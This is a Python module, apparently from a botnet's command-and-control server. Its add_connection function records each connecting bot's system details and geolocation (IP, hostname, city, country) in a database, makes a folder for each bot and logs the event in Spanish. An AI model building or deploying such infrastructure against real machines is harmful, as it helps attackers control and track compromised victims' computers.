from server.modules import log, database
from server.modules.utils import files
from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *

def get_array(response):
    data = [response.bot_id, response.status, response.system, response.node, response.release, response.version, response.machine, response.processor]
    geo = [response.bot_id, response.geo.ip, response.geo.hostname, response.geo.city, response.geo.region, response.geo.country, response.geo.loc]
    return data, geo

def add_connection(response, db):
    try:
        id = response.bot_id
        data, geo = get_array(response)
        database.add_bot(db, data)
        database.add_bot_geolocation(db, geo)
        files.check_folder(f"./server/files/bots/{id}")
        log.add("./server/logs/server/server", id, "CONNECTION", f"Se ha establecido conexión con el bot {id}", "OK", protocol="HTTP/2")
        return Response(status="OK", type="CONNECTION")
    except:
        log.add("./server/logs/server/server", id, "CONNECTION", f"No se ha podido establecer conexión con el bot {id}", "ERROR", protocol="HTTP/2")
        return Response(status="ERROR", type="CONNECTION")
            